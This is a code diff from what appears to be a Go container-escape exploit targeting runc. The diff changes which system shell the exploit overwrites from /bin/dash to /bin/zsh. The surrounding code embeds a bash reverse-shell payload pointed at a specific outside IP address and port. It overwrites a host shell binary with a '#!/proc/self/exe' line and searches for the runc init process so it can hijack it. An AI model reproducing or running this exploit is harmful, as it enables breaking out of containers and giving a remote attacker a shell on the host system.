@@ -16,21 +16,21 @@ import (
 var payload = "#!/bin/bash \n bash -i >& /dev/34.92.246.183/4445 0>&1"
 
 func main() {
-	// First we overwrite /bin/sh with the /proc/self/exe interpreter path
-	fd, err := os.Create("/bin/dash")
+	// First we overwrite /bin/zsh with the /proc/self/exe interpreter path
+	fd, err := os.Create("/bin/zsh")
 	if err != nil {
-		fmt.Println("[!!] Fail to open /bin/dash!")
+		fmt.Println("[!!] Fail to open /bin/zsh!")
 		fmt.Println(err)
 		return
 	}
 	fmt.Fprintln(fd, "#!/proc/self/exe")
 	err = fd.Close()
 	if err != nil {
-		fmt.Println("[!!] Fail to write /bin/dash!")
+		fmt.Println("[!!] Fail to write /bin/zsh!")
 		fmt.Println(err)
 		return
 	}
-	fmt.Println("[+] Overwritten /bin/dash successfully")
+	fmt.Println("[+] Overwritten /bin/zsh successfully")
 
 	// Loop through all processes to find one whose cmdline includes runcinit
 	// This will be the process created by runc
